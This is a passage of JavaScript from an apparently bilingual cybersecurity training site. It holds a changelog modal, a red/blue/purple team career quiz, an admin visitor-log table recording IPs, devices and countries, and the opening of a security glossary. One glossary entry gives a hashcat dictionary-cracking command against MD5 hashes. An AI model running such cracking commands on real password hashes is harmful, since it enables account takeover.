                        text: "<strong>Kali Ejderhası Açılış Animasyonu:</strong> Canvas parçacık simülasyonu, ses efektleri ve dinamik radar tarama grafikleri.",
                        text_en: "<strong>Kali Dragon Boot Splash Animation:</strong> Canvas particle simulation, terminal audio cues, and dynamic radar telemetry visuals."
                    },
                    {
                        cat: "ui",
                        tag: "Arayüz",
                        tag_en: "UI",
                        text: "<strong>6 Katmanlı 3D Tilt Kartları:</strong> Donanım hızlandırmalı perspektif ve ışık yansıma (glare) efektleriyle zenginleştirilmiş kurumsal mimari sunumu.",
                        text_en: "<strong>6-Layer 3D Tilt Architecture Cards:</strong> Hardware-accelerated perspective and radial glare effects showcasing defense layers."
                    },
                    {
                        cat: "feat",
                        tag: "Özellik",
                        tag_en: "Feature",
                        text: "<strong>Çoklu Siber Renk Profilleri:</strong> Cyber Midnight, Matrix Green, Red Alert ve Synthwave temaları.",
                        text_en: "<strong>Multi-Theme Cyber Color Profiles:</strong> Cyber Midnight, Matrix Green, Red Alert, and Synthwave presets."
                    }
                ]
            }
        ];

        let currentFilter = 'all';
        let searchQuery = '';

        function renderChangelog() {
            if (!listContainer) return;
            const isEn = (window.I18N && window.I18N.currentLang === 'en');
            const q = searchQuery.toLowerCase().trim();

            let filteredVersions = CHANGELOG_DATA.map(v => {
                let items = v.items;
                if (currentFilter !== 'all') {
                    items = items.filter(it => it.cat === currentFilter);
                }
                if (q) {
                    items = items.filter(it => {
                        const txt = (isEn ? it.text_en : it.text) || '';
                        const tag = (isEn ? it.tag_en : it.tag) || '';
                        return txt.toLowerCase().includes(q) || tag.toLowerCase().includes(q);
                    });
                }
                return { ...v, items };
            }).filter(v => v.items.length > 0);

            if (filteredVersions.length === 0) {
                listContainer.innerHTML = `
                    <div style="text-align: center; padding: 40px 20px; color: #64748b;">
                        <div style="font-size: 32px; margin-bottom: 12px;">🔍</div>
                        <div style="font-size: 14px; font-weight: 600; color: #94a3b8;">
                            ${isEn ? 'No updates found matching your search.' : 'Aramanızla eşleşen güncelleme kaydı bulunamadı.'}
                        </div>
                    </div>
                `;
                return;
            }

            listContainer.innerHTML = filteredVersions.map(ver => {
                const dateText = isEn && ver.date_en ? ver.date_en : ver.date;
                const badgeText = isEn && ver.badge_en ? ver.badge_en : ver.badge;
                const titleText = isEn && ver.title_en ? ver.title_en : ver.title;

                return `
                    <div class="changelog-entry-card ${ver.isLatest ? 'is-latest' : ''}">
                        <div class="changelog-node-dot"></div>
                        <div class="changelog-card-inner">
                            <div class="changelog-entry-header">
                                <div class="changelog-version-title">
                                    <span style="color: ${ver.isLatest ? '#10b981' : '#c084fc'};">${ver.version}</span>
                                    <span>&bull;</span>
                                    <span>${escapeHtml(titleText)}</span>
                                    <span class="changelog-tag-pill tag-${ver.isLatest ? 'acad' : 'ui'}">${badgeText}</span>
                                </div>
                                <span class="changelog-date-tag">📅 ${dateText}</span>
                            </div>
                            <ul class="changelog-items-list">
                                ${ver.items.map(it => {
                                    const tagText = isEn && it.tag_en ? it.tag_en : it.tag;
                                    const itemText = isEn && it.text_en ? it.text_en : it.text;
                                    return `
                                        <li class="changelog-item">
                                            <span class="changelog-tag-pill tag-${it.cat}">${tagText}</span>
                                            <span>${itemText}</span>
                                        </li>
                                    `;
                                }).join('')}
                            </ul>
                        </div>
                    </div>
                `;
            }).join('');
        }

        function openModal() {
            modal.classList.remove('hidden');
            renderChangelog();
            if (searchInput) searchInput.focus();
        }

        function closeModal() {
            modal.classList.add('hidden');
        }

        if (topbarBtn) {
            topbarBtn.onclick = (e) => {
                if (e) e.preventDefault();
                openModal();
            };
        }

        if (sidebarBtn) {
            sidebarBtn.onclick = (e) => {
                if (e) e.preventDefault();
                openModal();
            };
        }

        if (closeBtn) closeBtn.onclick = closeModal;
        if (footerCloseBtn) footerCloseBtn.onclick = closeModal;

        modal.addEventListener('click', (e) => {
            if (e.target === modal) closeModal();
        });

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && !modal.classList.contains('hidden')) {
                closeModal();
            }
        });

        if (filtersContainer) {
            filtersContainer.querySelectorAll('.changelog-filter-btn').forEach(btn => {
                btn.addEventListener('click', () => {
                    filtersContainer.querySelectorAll('.changelog-filter-btn').forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    currentFilter = btn.dataset.filter || 'all';
                    renderChangelog();
                });
            });
        }

        if (searchInput) {
            searchInput.addEventListener('input', () => {
                searchQuery = searchInput.value;
                renderChangelog();
            });
        }

        window.addEventListener('languageChanged', () => {
            if (!modal.classList.contains('hidden')) {
                renderChangelog();
            }
        });

        // Global export
        window.LFL_CHANGELOG = {
            open: openModal,
            close: closeModal,
            render: renderChangelog,
            getData: () => CHANGELOG_DATA
        };

        renderChangelog();
    }

    function bindCyberRoleQuiz() {
        const container = document.getElementById('quiz-main-container');
        const btnRestart = document.getElementById('btn-restart-quiz');
        if (!container) return;

        const quizQuestions = [
            {
                q: "1. Bir otele gittiğinde oda kapısındaki elektronik kartlı kilidi görünce aklından ilk ne geçer?",
                q_en: "1. When you see an electronic card lock on a hotel room door, what is your first thought?",
                options: [
                    { text: "Bu kart okuyucu acaba manyetik bir hileyle kandırılabilir mi veya kilitte gizli bir açık var mıdır?", team: "red", icon: "" },
                    { text: "Umarım kapı zorlandığında içerideki güvenlik paneline ve resepsiyona anında alarm gidiyordur.", team: "blue", icon: "" },
                    { text: "Otelin genel güvenlik planını merak ederim; yangın çıkarsa veya elektrik kesilirse kapılar ne yapıyor?", team: "purple", icon: "" }
                ]
            },
            {
                q: "2. Arkadaşlarınla kutu oyunu veya strateji oyunu oynarken hangi taktik seni daha çok eğlendirir?",
                q_en: "2. When playing strategy or board games with friends, which tactic do you enjoy most?",
                options: [
                    { text: "Rakibin hiç beklemediği gizli yollardan arkasına dolanıp sürpriz hamleyle kaleyi düşürmek.", team: "red", icon: "" },
                    { text: "Kendi bölgemi aşılmaz bir kale haline getirip gelen tüm saldırıları tek tek püskürtmek.", team: "blue", icon: "" },
                    { text: "Kimin kime saldıracağını önceden tahmin edip masadaki dengeleri ve ortak kuralları yönetmek.", team: "purple", icon: "" }
                ]
            },
            {
                q: "3. Bir polisiye veya casusluk filminde hangi karakterin yerinde olmak isterdin?",
                q_en: "3. In a detective or spy film, which character's role would you rather play?",
                options: [
                    { text: "En karmaşık şifreli kasaları çözen ve kimseye görünmeden içeri sızabilen dahi casus.", team: "red", icon: "" },
                    { text: "Olay yerindeki en ufak ayak izini veya parmak izini büyüteçle inceleyip suçluyu yakalayan adli tıp uzmanı.", team: "blue", icon: "" },
                    { text: "Hem suçlunun psikolojisini çözen hem de ekibin operasyonunu yöneten büyük resmi gören başkomiser.", team: "purple", icon: "" }
                ]
            },
            {
                q: "4. Telefonuna 'Tebrikler! 25.000 TL hediye kazandınız, hemen linke tıklayın' mesajı gelse ne yaparsın?",
                q_en: "4. If you get a text saying 'Congratulations! You won $25,000, click here immediately', what do you do?",
                options: [
                    { text: "Bu sahte linkin arkasında kimin olduğunu ve insanları nasıl kandırdıklarını merak edip perde arkasını incelerim.", team: "red", icon: "" },
                    { text: "Numarayı anında engeller, mesajı siler ve ailemi bu tür tuzaklara düşmemeleri için hemen uyarırım.", team: "blue", icon: "" },
                    { text: "Bu tür dolandırıcılık yöntemlerini inceleyip insanların kandırılmasını önleyecek bir bilinçlendirme rehberi hazırlarım.", team: "purple", icon: "" }
                ]
            },
            {
                q: "5. Yeni aldığın akıllı telefon veya cihazın kutusunu ilk açtığında ne yaparsın?",
                q_en: "5. When unboxing a brand-new smartphone or smart gadget, what is your first instinct?",
                options: [
                    { text: "Ayarlarını kurcalayıp gizli menüleri, kısıtlamaları veya üreticinin kapatmak istediği şeyleri açmaya çalışırım.", team: "red", icon: "" },
                    { text: "Hemen koruyucu kılıf takıp; yüz tanıma, çift adımlı SMS doğrulama ve konum güvenliği ayarlarını açarım.", team: "blue", icon: "" },
                    { text: "Kullanım kılavuzunu inceleyip cihazın hem sunduğu avantajları hem de zayıf yönlerini eksiksiz öğrenirim.", team: "purple", icon: "" }
                ]
            },
            {
                q: "6. Büyük bir bankada veya kurumda çalışsaydın hangi görev sana daha heyecan verici gelirdi?",
                q_en: "6. If you worked at a major enterprise or bank, which mission would excite you more?",
                options: [
                    { text: "Yönetimin izniyle şirketin binasına veya sistemine gizlice sızmayı deneyip güvenlik açıklarını ispatlamak.", team: "red", icon: "" },
                    { text: "Bankanın kasasını ve müşteri hesaplarını 7/24 izleyip hiçbir şüpheli para hareketine izin vermemek.", team: "blue", icon: "" },
                    { text: "Hem güvenlik görevlilerini hem teftiş ekibini toplayıp acil durum ve güvenlik tatbikatları yaptırmak.", team: "purple", icon: "" }
                ]
            },
            {
                q: "7. Bir zeka bulmacası veya kaçış odası oyununda seni en çok tatmin eden an hangisidir?",
                q_en: "7. In an escape room or logic puzzle game, which moment satisfies you most?",
                options: [
                    { text: "Oyun kurucusunun fark etmediği bir kestirme yol veya ipucu bularak odayı herkesten önce açmak.", team: "red", icon: "" },
                    { text: "Odadaki tüm ipuçlarını ve şifreleri adım adım, sırayla ve hiçbir detayı atlamadan eksiksiz çözmek.", team: "blue", icon: "" },
                    { text: "Bulmacanın ardındaki ana mekanizmayı kavrayıp diğer oyunculara taktik vermek ve oyunu yönetmek.", team: "purple", icon: "" }
                ]
            },
            {
                q: "8. Büyük bir şirketin müşteri şifrelerini çaldırdığı haberini duydun. Aklından geçen ilk düşünce ne olur?",
                q_en: "8. You hear that a major enterprise suffered a customer credential breach. What is your first thought?",
                options: [
                    { text: "'Hırsızlar hangi akıllıca yöntemle veya hangi gizli açık kapıdan içeri sızmayı başardı acaba?'", team: "red", icon: "" },
                    { text: "'Bu şirket neden iki aşamalı SMS onayı ve şifreli kalkanlar kullanmamış, bu kabul edilemez!'", team: "blue", icon: "" },
                    { text: "'Bu durum şirketin geleceğini nasıl etkiler ve sistemi yeniden kurarken ne tür kurallar koymalılar?'", team: "purple", icon: "" }
                ]
            },
            {
                q: "9. Sana bir süper kahraman gücü verilseydi hangisini seçerdin?",
                q_en: "9. If you were granted a superhero ability, which one would you choose?",
                options: [
                    { text: "Görünmez olup kilitli kapıların arkasından rahatça geçebilme ve gizli sırları keşfetme gücü.", team: "red", icon: "" },
                    { text: "Kendini ve tüm sevdiklerini her türlü tehlikeden koruyan kurşun geçirmez aşılmaz bir enerji kalkanı.", team: "blue", icon: "" },
                    { text: "Olayları daha gerçekleşmeden hissedip hem savunmayı hem hamleleri yönetebilen geleceği sezme gücü.", team: "purple", icon: "" }
                ]
            },
            {
                q: "10. Siber dünyada ilerlemek istesen hangi unvan kulağına en havalı ve sana en uygun geliyor?",
                q_en: "10. If pursuing a cybersecurity career, which title sounds most thrilling and fitting for you?",
                options: [
                    { text: "Sistemlerin açık kapılarını bularak şirketlerin korunmasını sağlayan 'Etik Hacker' (Red Team).", team: "red", icon: "" },
                    { text: "Sistemleri virüslere ve siber korsanlara karşı bir kale gibi koruyan 'Siber Savunma Muhafızı' (Blue Team).", team: "blue", icon: "" },
                    { text: "Hem saldırıyı hem savunmayı yöneten ve büyük stratejiyi belirleyen 'Siber Güvenlik Lideri' (Purple Team).", team: "purple", icon: "" }
                ]
            }
        ];

        let currentStep = 0;
        let answers = [];

        function renderStep() {
            if (currentStep >= quizQuestions.length) {
                renderResults();
                return;
            }

            const qObj = quizQuestions[currentStep];
            const progressPct = Math.round(((currentStep + 1) / quizQuestions.length) * 100);
            const currentSelected = answers[currentStep];
            const isEn = (window.I18N && window.I18N.currentLang === 'en');
            const qTitle = isEn && qObj.q_en ? qObj.q_en : qObj.q;
            const stepLabel = isEn ? `QUESTION ${currentStep + 1} / ${quizQuestions.length}` : `SORU ${currentStep + 1} / ${quizQuestions.length}`;
            const pctLabel = isEn ? `${progressPct}% Completed` : `${progressPct}% Tamamlandı`;
            const prevLabel = isEn ? '&larr; Previous Question' : '&larr; Önceki Soru';
            const autoLabel = isEn ? 'Click an option to advance automatically' : 'Bir seçeneğe tıkladığınızda otomatik ilerler';

            container.innerHTML = `
                <div class="quiz-progress-bar-wrap">
                    <div class="quiz-progress-fill" style="width: ${progressPct}%;"></div>
                </div>

                <div class="quiz-question-header">
                    <span class="quiz-step-badge">${stepLabel}</span>
                    <span style="font-size: 12px; color: var(--text-muted); font-family: var(--font-mono);">${pctLabel}</span>
                </div>

                <h3 class="quiz-question-title">${escapeHtml(qTitle)}</h3>

                <div class="quiz-options-list">
                    ${qObj.options.map(opt => `
                        <div class="quiz-option-item ${currentSelected === opt.team ? 'selected' : ''}" data-team="${opt.team}">
                            <span class="quiz-option-icon">${opt.icon}</span>
                            <span class="quiz-option-text">${escapeHtml(isEn && opt.text_en ? opt.text_en : opt.text)}</span>
                        </div>
                    `).join('')}
                </div>

                <div class="quiz-nav-row">
                    ${currentStep > 0 ? `
                        <button type="button" class="btn-secondary btn-sm" id="btn-quiz-prev">${prevLabel}</button>
                    ` : `<div></div>`}
                    <span style="font-size: 11.5px; color: var(--text-muted);">${autoLabel}</span>
                </div>
            `;

            container.querySelectorAll('.quiz-option-item').forEach(item => {
                item.addEventListener('click', () => {
                    const team = item.dataset.team;
                    answers[currentStep] = team;
                    item.classList.add('selected');
                    setTimeout(() => {
                        currentStep++;
                        renderStep();
                    }, 240);
                });
            });

            const prevBtn = document.getElementById('btn-quiz-prev');
            if (prevBtn) {
                prevBtn.addEventListener('click', () => {
                    if (currentStep > 0) {
                        currentStep--;
                        renderStep();
                    }
                });
            }
        }

        function renderResults() {
            const redCount = answers.filter(a => a === 'red').length;
            const blueCount = answers.filter(a => a === 'blue').length;
            const purpleCount = answers.filter(a => a === 'purple').length;

            const redPct = Math.round((redCount / answers.length) * 100);
            const bluePct = Math.round((blueCount / answers.length) * 100);
            const purplePct = Math.round((purpleCount / answers.length) * 100);

            const isEn = (window.I18N && window.I18N.currentLang === 'en');
            let winningTeam = 'red';
            let roleIcon = '⚔️';
            let roleTitle = isEn ? 'RED TEAM // ETHICAL HACKER & PENETRATION TESTER' : 'RED TEAM // ETİK HACKER & AÇIK AVCISI';
            let roleColor = '#f87171';
            let roleDesc = isEn 
                ? 'Congratulations! Your mind operates with curiosity and deduction like a master investigator. You have a natural hunter\'s instinct for uncovering forgotten credentials, system backdoors, and overlooked vulnerabilities. Even with zero prior coding knowledge, your inquisitive mindset makes you a natural fit for "Ethical Hacking" (Red Team) to safeguard systems before malicious attackers strike!'
                : 'Tebrikler! Zihnin tıpkı bir dedektif veya kilit ustası gibi meraklı ve sorgulayıcı çalışıyor. Sistemlerin açık kapılarını, unutulan şifrelerini ve gözden kaçan zayıf noktalarını sezmekte doğuştan gelen bir avcı içgüdün var. Sıfır yazılım bilsen bile bu merak seni sistemleri kötü niyetli saldırganlardan önce test edip koruyan bir "Etik Hacker" (Red Team) yapabilir!';
            let targetCategory = 'nmap';

            if (blueCount >= redCount && blueCount >= purpleCount) {
                winningTeam = 'blue';
                roleIcon = '🛡️';
                roleTitle = isEn ? 'BLUE TEAM // CYBER DEFENSE & SHIELD GUARDIAN' : 'BLUE TEAM // SİBER SAVUNMA & KALE MUHAFIZI';
                roleColor = '#60a5fa';
                roleDesc = isEn
                    ? 'Outstanding! Your mind operates like a steadfast fortress guardian and watchful sentinel. Hardening systems with impenetrable armor, detecting anomalies in real-time, and neutralizing intrusions at the perimeter is your natural calling. You have immense potential as a "Cyber Defense Specialist" (Blue Team) protecting critical infrastructure!'
                    : 'Harika! Zihnin koruyucu bir kale muhafızı ve dikkatli bir nöbetçi gibi çalışıyor. Sistemleri aşılmaz bir zırhla donatmak, şüpheli hareketleri anında sezmek ve izinsiz girişleri kapıda durdurmak senin uzmanlık alanın. Kurumları ve insanları siber korsanlara karşı koruyan bir "Siber Savunma Uzmanı" (Blue Team) potansiyelin çok yüksek!';
                targetCategory = 'blue';
            } else if (purpleCount > redCount && purpleCount > blueCount) {
                winningTeam = 'purple';
                roleIcon = '🟣';
                roleTitle = isEn ? 'PURPLE TEAM // STRATEGIST & CYBERSECURITY LEADER' : 'PURPLE TEAM // STRATEJİST & SİBER GÜVENLİK LİDERİ';
                roleColor = '#c084fc';
                roleDesc = isEn
                    ? 'Magnificent! You are a strategic visionary who sees both attack and defense simultaneously. You understand criminal psychology as well as enterprise resilience. Bridging offensive and defensive operations, orchestrating red/blue exercises, and guiding crisis response makes you an ideal "Cybersecurity Strategist" (Purple Team)!'
                    : 'Muhteşem! Sen hem saldırıyı hem savunmayı aynı anda dengeli gören stratejik bir lidersin. Bir suçlunun nasıl düşüneceğini de, güvenliğin nasıl sağlanması gerektiğini de büyük resimden görüyorsun. İki tarafı buluşturan, tatbikatları yöneten ve kriz anında doğru kararları alan bir "Siber Güvenlik Stratejisti" (Purple Team) kumaşına sahipsin!';
                targetCategory = 'all';
            }

            const resBadge = isEn ? 'ANALYSIS RESULT // 100% COMPLETED' : 'ANALİZ SONUCU // %100 TAMAMLANDI';
            const redTeamLabel = isEn ? '⚔️ Red Team (Offensive / Penetration):' : '⚔️ Red Team (Ofansif / Hücum):';
            const blueTeamLabel = isEn ? '🛡️ Blue Team (Defensive / Blue Watch):' : '🛡️ Blue Team (Defansif / Savunma):';
            const purpleTeamLabel = isEn ? '🟣 Purple Team (Integrated Strategy):' : '🟣 Purple Team (Entegre Strateji):';
            const redScoreLabel = isEn ? `${redPct}% (${redCount}/10 Questions)` : `${redPct}% (${redCount}/10 Soru)`;
            const blueScoreLabel = isEn ? `${bluePct}% (${blueCount}/10 Questions)` : `${bluePct}% (${blueCount}/10 Soru)`;
            const purpleScoreLabel = isEn ? `${purplePct}% (${purpleCount}/10 Questions)` : `${purplePct}% (${purpleCount}/10 Soru)`;
            const btnJumpAcadText = isEn ? '🎓 Open Your Personalized Academy Rooms &rarr;' : '🎓 Sana Özel Akademi Odalarını Aç &rarr;';
            const btnJumpCmdsText = isEn ? '📚 Open 140+ Cyber Command Library' : '📚 140+ Kod Kütüphanesini Aç';
            const btnJumpTermText = isEn ? '💻 Open Kali Web Terminal' : '💻 Kali Web Terminalini Aç';
            const btnRestartText = isEn ? '🔄 Retake Quiz' : '🔄 Testi Tekrar Çöz';

            container.innerHTML = `
                <div class="quiz-result-box">
                    <div class="quiz-result-hero-icon">${roleIcon}</div>
                    <div class="page-tier-badge" style="background: rgba(255,255,255,0.06); color: ${roleColor}; border-color: ${roleColor}; margin-bottom: 8px;">
                        ${resBadge}
                    </div>
                    <h2 class="quiz-result-role-title" style="color: ${roleColor};">${roleTitle}</h2>
                    <p class="quiz-result-desc">${escapeHtml(roleDesc)}</p>

                    <div class="quiz-breakdown-bars">
                        <div class="quiz-bar-item">
                            <div class="quiz-bar-label-row">
                                <span style="color: #f87171;">${redTeamLabel}</span>
                                <span style="color: #f87171;">${redScoreLabel}</span>
                            </div>
                            <div class="quiz-bar-track">
                                <div class="quiz-bar-fill" style="width: ${redPct}%; background: #ef4444;"></div>
                            </div>
                        </div>

                        <div class="quiz-bar-item">
                            <div class="quiz-bar-label-row">
                                <span style="color: #60a5fa;">${blueTeamLabel}</span>
                                <span style="color: #60a5fa;">${blueScoreLabel}</span>
                            </div>
                            <div class="quiz-bar-track">
                                <div class="quiz-bar-fill" style="width: ${bluePct}%; background: #3b82f6;"></div>
                            </div>
                        </div>

                        <div class="quiz-bar-item">
                            <div class="quiz-bar-label-row">
                                <span style="color: #c084fc;">${purpleTeamLabel}</span>
                                <span style="color: #c084fc;">${purpleScoreLabel}</span>
                            </div>
                            <div class="quiz-bar-track">
                                <div class="quiz-bar-fill" style="width: ${purplePct}%; background: #a855f7;"></div>
                            </div>
                        </div>
                    </div>

                    <div class="quiz-actions-row">
                        <button type="button" class="btn-glow-blue" id="btn-quiz-jump-academy">
                            ${btnJumpAcadText}
                        </button>
                        <button type="button" class="btn-secondary" id="btn-quiz-jump-commands">
                            ${btnJumpCmdsText}
                        </button>
                        <button type="button" class="btn-secondary" id="btn-quiz-jump-terminal">
                            ${btnJumpTermText}
                        </button>
                        <button type="button" class="btn-secondary" id="btn-quiz-restart-inner">
                            ${btnRestartText}
                        </button>
                    </div>
                </div>
            `;

            const btnJumpAcad = document.getElementById('btn-quiz-jump-academy');
            if (btnJumpAcad) {
                btnJumpAcad.addEventListener('click', () => {
                    window.location.href = `academy.html?track=${encodeURIComponent(winningTeam)}`;
                });
            }

            const btnJumpCommands = document.getElementById('btn-quiz-jump-commands');
            if (btnJumpCommands) {
                btnJumpCommands.addEventListener('click', () => {
                    navigateToPage('page-commands');
                    const catPill = document.querySelector(`#academy-category-pills [data-cat="${targetCategory}"]`);
                    if (catPill) catPill.click();
                });
            }

            const btnJumpTerm = document.getElementById('btn-quiz-jump-terminal');
            if (btnJumpTerm) {
                btnJumpTerm.addEventListener('click', () => navigateToPage('page-terminal'));
            }

            const btnRestartInner = document.getElementById('btn-quiz-restart-inner');
            if (btnRestartInner) {
                btnRestartInner.addEventListener('click', () => {
                    currentStep = 0;
                    answers = [];
                    renderStep();
                });
            }
        }

        if (btnRestart) {
            window.addEventListener('languageChanged', () => {
            if (currentStep < quizQuestions.length) renderStep();
            else renderResults();
        });

        btnRestart.addEventListener('click', () => {
                currentStep = 0;
                answers = [];
                renderStep();
                showToast('info', 'Test Sıfırlandı', '10 soruluk test baştan başlatıldı.');
            });
        }

        renderStep();
    }

    // ==========================================
    // VISITOR & ACCESS LOGS PANEL (ADMIN ONLY)
    // ==========================================
    async function loadAccessLogs() {
        if (!state.currentUser || (state.currentUser.role !== 'admin' && state.currentUser.role !== 'operative')) {
            return;
        }

        try {
            const data = await api.getAccessLogs();
            state.accessLogs = data.logs || [];

            const totalEl = document.getElementById('log-stat-total');
            if (totalEl) totalEl.textContent = state.accessLogs.length;

            const ipsEl = document.getElementById('log-stat-ips');
            if (ipsEl) {
                const uniqueIps = new Set(state.accessLogs.map(l => l.ipAddress)).size;
                ipsEl.textContent = uniqueIps;
            }

            const adminsEl = document.getElementById('log-stat-admins');
            if (adminsEl) {
                const adminCount = state.accessLogs.filter(l => l.role === 'admin' || l.username === 'lostfromlight' || l.username === 'admin').length;
                adminsEl.textContent = adminCount;
            }

            const statusEl = document.getElementById('log-stat-status');
            if (statusEl) statusEl.textContent = '100% YAKALANIYOR';

            const searchInput = document.getElementById('logs-search-input');
            renderAccessLogs(searchInput ? searchInput.value : '');
        } catch (err) {
            console.error('[LFL] Log yükleme hatası:', err);
        }
    }

    function renderAccessLogs(filterQuery = '') {
        const tbody = document.getElementById('access-logs-tbody');
        if (!tbody) return;

        const q = (filterQuery || '').toLowerCase().trim();
        const filtered = state.accessLogs.filter(item => {
            if (!q) return true;
            return (item.ipAddress && item.ipAddress.toLowerCase().includes(q)) ||
                (item.operatingSystem && item.operatingSystem.toLowerCase().includes(q)) ||
                (item.browser && item.browser.toLowerCase().includes(q)) ||
                (item.deviceType && item.deviceType.toLowerCase().includes(q)) ||
                (item.username && item.username.toLowerCase().includes(q)) ||
                (item.role && item.role.toLowerCase().includes(q)) ||
                (item.path && item.path.toLowerCase().includes(q));
        });

        if (filtered.length === 0) {
            tbody.innerHTML = `<tr><td colspan="7" class="text-center text-muted" style="padding: 24px;">Filtreye uygun log kaydı bulunamadı.</td></tr>`;
            return;
        }

        tbody.innerHTML = filtered.map(log => {
            const timeStr = log.timestamp ? new Date(log.timestamp).toLocaleTimeString() : '--:--:--';
            const dateStr = log.timestamp ? new Date(log.timestamp).toLocaleDateString() : '';
            const isAdmin = log.role === 'admin' || log.username === 'burak_wyxz';
            const isGuest = log.role === 'guest' || !log.username || log.username === 'Anonim Ziyaretçi';
            const roleBadgeClass = isAdmin ? 'badge-role-admin' : isGuest ? 'badge-role-guest' : 'badge-role-user';

            const statusBadgeClass = log.statusCode >= 200 && log.statusCode < 300
                ? 'badge-soft-green'
                : log.statusCode === 401 || log.statusCode === 403
                    ? 'badge-soft-red'
                    : 'badge-soft-cyan';

            const screenText = log.screen ? `<br/><span style="font-size: 10px; color: var(--text-muted); font-family: var(--font-mono);">${escapeHtml(log.screen)}</span>` : '';
            const connText = log.connection ? `<br/><span style="font-size: 9.5px; color: #a7f3d0; font-family: var(--font-mono);">⚡ ${escapeHtml(log.connection)}</span>` : '';
            const coresText = log.cores ? `<br/><span style="font-size: 10px; color: #94a3b8; font-family: var(--font-mono);">${escapeHtml(log.cores)}</span>` : '';
            const locText = log.country ? `<br/><span style="font-size: 10px; color: #38bdf8;">📍 ${escapeHtml(log.country)}</span>` : '';

            return `
                <tr>
                    <td style="font-family: var(--font-mono); font-size: 11px; color: var(--text-muted); white-space: nowrap;">
                        <span style="color: var(--cyan); font-weight: 700;">${escapeHtml(timeStr)}</span>
                        <br/>${escapeHtml(dateStr)}
                    </td>
                    <td>
                        <span class="badge-ip-mono" style="font-weight: 800; color: #38bdf8;">${escapeHtml(log.ipAddress)}</span>
                        ${locText}
                    </td>
                    <td>
                        <span class="badge-os" style="font-weight: 700;">${escapeHtml(log.operatingSystem)}</span>
                        ${coresText}
                    </td>
                    <td style="font-size: 12px;">
                        <span style="font-weight: 600; color: #ffffff;">${escapeHtml(log.browser)}</span>
                        <span style="color: var(--text-muted); font-size: 11px;">(${escapeHtml(log.deviceType || 'Masaüstü')})</span>
                        ${screenText}
                        ${connText}
                    </td>
                    <td>
                        <span class="${roleBadgeClass}">${escapeHtml(log.username)}</span>
                    </td>
                    <td style="font-family: var(--font-mono); font-size: 11px;">
                        <span style="color: var(--text-secondary); font-weight: 600;">${escapeHtml(log.method || 'GET')}</span>
                        <code style="color: var(--cyan); margin-left: 4px;">${escapeHtml(log.path)}</code>
                    </td>
                    <td>
                        <span class="${statusBadgeClass}">${escapeHtml(String(log.statusCode || 200))} OK</span>
                    </td>
                </tr>
            `;
        }).join('');
    }

    function bindAccessLogsPanel() {
        const searchInput = document.getElementById('logs-search-input');
        if (searchInput) {
            searchInput.addEventListener('input', () => {
                renderAccessLogs(searchInput.value);
            });
        }

        const btnRefresh = document.getElementById('btn-refresh-logs');
        if (btnRefresh) {
            btnRefresh.addEventListener('click', async () => {
                await loadAccessLogs();
                showToast('info', 'Loglar Güncellendi', 'Ziyaretçi erişim logları yenilendi.');
            });
        }

        const btnExport = document.getElementById('btn-export-logs');
        if (btnExport) {
            btnExport.addEventListener('click', () => {
                if (state.accessLogs.length === 0) {
                    showToast('error', 'Hata', 'Dışa aktarılacak log verisi bulunmuyor.');
                    return;
                }
                const blob = new Blob([JSON.stringify(state.accessLogs, null, 2)], { type: 'application/json' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `lfl-access-telemetry-${Date.now()}.json`;
                document.body.appendChild(a);
                a.click();
                a.remove();
                URL.revokeObjectURL(url);
                showToast('success', 'İndirildi', 'Log verisi JSON formatında indirildi.');
            });
        }
    }

    // ==========================================
    // SİBER KILAVUZ & SÖZLÜK (A-Z) // 30+ ZENGİN TERİM
    // ==========================================
    const glossaryData = [
        // --- KİMLİK & OTURUM (auth) ---
        {
            tag: "MFA",
            title: "Multi-Factor Authentication (Çok Faktörlü Doğrulama)",
            category: "auth",
            desc: "Kullanıcının hesabına girmesi için yalnızca şifrenin yetmediği; telefonuna gelen kod (SMS/Authenticator) veya donanım güvenlik anahtarı (FIDO2/YubiKey) gibi ikinci bir delil sunmasını şart koşan güvenlik mekanizmasıdır.",
            analogy: "Evin kapısını hem anahtarla açıp, hem de içerideki güvenlik paneline parmak izinizi okutmak gibidir. Hırsız anahtarı çalsa bile eve giremez.",
            mitigates: "Şifre Çalma, Credential Stuffing, Phishing (Oltalama)"
        },
        {
            tag: "JWT",
            title: "JSON Web Token (Kriptografik Oturum Zarfı)",
            category: "auth",
            desc: "Kullanıcı giriş yaptıktan sonra sunucunun ürettiği, içinde kullanıcının rolü ve yetkilerini taşıyan, kriptografik HMAC-SHA256 ile imzalanmış dijital kimlik kartıdır.",
            analogy: "Konsere girerken bileğinize takılan, taklit edilemez hologramlı ve barkodlu giriş bilekliği gibidir. Görevliler her kapıda kimliğinizi sormaz, bilekliği okutursunuz.",
            mitigates: "Oturum Sahteciliği (Session Hijacking), Yetkisiz Yetki Yükseltme"
        },
        {
            tag: "HASH-SALT",
            title: "Parola Kriptografik Özeti & Tuzlama (Salted Hashing)",
            category: "auth",
            desc: "Veritabanında şifrelerin açık metin değil, tek yönlü matematiksel algoritmalarla (BCrypt, Argon2, PBKDF2) ve her kullanıcıya özel rastgele bir 'tuz' (salt) eklenerek saklanmasıdır.",
            analogy: "Bir elmayı püre haline getirip içine bir avuç kum atmak gibidir. Püreyi tekrar eski sağlam elmaya dönüştüremezsiniz ama iki pürenin aynı olup olmadığını karşılaştırabilirsiniz.",
            mitigates: "Gökkuşağı Tablosu (Rainbow Table) Saldırıları, Veritabanı Sızıntıları",
            cmd: "hashcat -m 0 -a 0 hash.txt rockyou.txt"
        },
        {
            tag: "OAUTH2",
            title: "OAuth 2.0 & OpenID Connect",
            category: "auth",
            desc: "Kullanıcının şifresini üçüncü parti uygulamalara vermeden 'Google ile Giriş Yap' veya 'GitHub ile Giriş Yap' butonlarıyla güvenle yetkilendirilmesini sağlayan açık standarttır.",
            analogy: "Otelde vale hizmetine arabanızın anahtarını değil, sadece arabayı park etmeye yarayan kısıtlı bir vale anahtarını vermek gibidir. Torpidonuzu açamaz.",
            mitigates: "Parola Paylaşımı, Üçüncü Parti Veri Hırsızlığı"
        },
        {
            tag: "SESSION-HIJACK",
            title: "Oturum Kaçırma (Session Hijacking / Sidejacking)",
            category: "auth",
            desc: "Saldırganın aktif bir web oturumuna ait çerezleri (Session Cookie) veya JWT tokenini çalarak kullanıcı adına işlem yapması durumudur.",
            analogy: "Otobüs biletinizi cebinizden gizlice alıp otobüse sizin yerinize binen yabancı bir yolcu gibidir.",
